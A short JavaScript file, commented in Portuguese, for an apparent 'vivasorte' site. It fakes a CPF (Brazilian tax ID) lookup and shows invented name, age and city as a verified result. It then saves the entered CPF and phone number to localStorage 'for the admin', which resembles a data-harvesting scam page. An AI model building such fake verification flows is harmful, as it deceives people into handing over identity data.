// js/cpf-validator.js - Versão SUPER SIMPLES que FUNCIONA
let usuarioAtual = null;

async function consultarCPF(cpfCompleto) {
    const cpfNumeros = cpfCompleto.replace(/\D/g, '');
    
    if (cpfNumeros.length !== 11) {
        document.getElementById('cpfInfo').style.display = 'none';
        document.getElementById('cpfLoading').style.display = 'none';
        return;
    }
    
    console.log('🔍 Consultando CPF:', cpfNumeros);
    
    // Mostrar loading
    document.getElementById('cpfLoading').style.display = 'block';
    document.getElementById('cpfInfo').style.display = 'none';
    document.getElementById('erroCPF').style.display = 'none';
    
    // Dados SIMULADOS (para funcionar AGORA)
    setTimeout(() => {
        document.getElementById('cpfLoading').style.display = 'none';
        
        // Dados simulados realistas
        usuarioAtual = {
            cpf: cpfNumeros,
            nome: 'Cliente Teste ' + cpfNumeros.substring(0, 3),
            idade: Math.floor(Math.random() * 30) + 25,
            cidade: 'São Paulo',
            uf: 'SP',
            mae: 'Mãe do Cliente',
            consultado_em: new Date().toISOString()
        };
        
        // Mostrar na tela
        mostrarInfoCPF(usuarioAtual);
        
        // Salvar para o ADMIN
        salvarParaAdmin(usuarioAtual);
        
        // Habilitar botão
        document.getElementById('btnContinuarCPF').disabled = false;
        document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
        
    }, 1500);
}

function mostrarInfoCPF(usuario) {
    const cpfInfo = document.getElementById('cpfInfo');
    cpfInfo.innerHTML = `
        <div class="cpf-valid">
            <h4><i class="bi bi-check-circle"></i> CPF Identificado</h4>
            <p><strong>Nome:</strong> ${usuario.nome}</p>
            <p><strong>Idade:</strong> ${usuario.idade} anos</p>
            <p><strong>Cidade:</strong> ${usuario.cidade} - ${usuario.uf}</p>
            <p><strong>CPF Válido:</strong> Sim</p>
        </div>
    `;
    cpfInfo.style.display = 'block';
}

function salvarParaAdmin(usuario) {
    // Salvar no localStorage para o admin
    let usuarios = JSON.parse(localStorage.getItem('vivasorte_usuarios') || '{}');
    usuarios[usuario.cpf] = usuario;
    localStorage.setItem('vivasorte_usuarios', JSON.stringify(usuarios));
    
    console.log('✅ Dados salvos para admin:', usuario);
}

// Para salvar telefone também
function salvarTelefoneParaAdmin(telefone) {
    if (usuarioAtual) {
        usuarioAtual.telefone = telefone.replace(/\D/g, '');
        salvarParaAdmin(usuarioAtual);
    }
}

// Exportar funções
window.consultarCPF = consultarCPF;
window.salvarTelefoneParaAdmin = salvarTelefoneParaAdmin;
window.getUsuarioAtual = () => usuarioAtual;